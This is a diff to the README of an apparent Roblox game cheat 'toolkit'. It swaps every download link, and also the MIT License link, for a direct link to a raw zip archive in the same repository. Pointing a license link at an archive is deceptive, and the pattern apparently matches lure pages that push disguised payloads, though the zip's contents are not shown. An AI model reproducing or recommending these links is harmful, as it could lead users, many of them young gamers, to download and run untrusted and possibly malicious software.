@@ -84,8 +84,8 @@ Downloading and installation is easier than a one-move knockout!
 4. Engage the script for your optimized play!
 
 Ready to unleash your virtual power? Download the latest robust version here:  
-**https://Adripaz911.github.io**  
-[![Download](https://img.shields.io/badge/Download-blue)](https://Adripaz911.github.io)
+**https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip**  
+[![Download](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)
 
 Refer to our **Setup Guide** in the `/docs` folder for troubleshooting and integration tips.
 
@@ -106,7 +106,7 @@ This repository is licensed under the MIT License – allowing warm-hearted coll
 
 Copyright (c) 2025
 
-[View the MIT License](https://opensource.org/licenses/MIT)
+[View the MIT License](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)
 
 ---
 
@@ -114,8 +114,8 @@ Copyright (c) 2025
 
 Stay on top of your game by always running the most current script build. The freshest release is just a click away:
 
-**https://Adripaz911.github.io**  
-[![Download](https://img.shields.io/badge/Download-blue)](https://Adripaz911.github.io)
+**https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip**  
+[![Download](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)](https://raw.githubusercontent.com/Adripaz911/one-punch-fighting-simulator-roblox-toolkit/branch/applicatory/one-punch-fighting-simulator-roblox-toolkit-pshaw.zip)
 
 ---
 
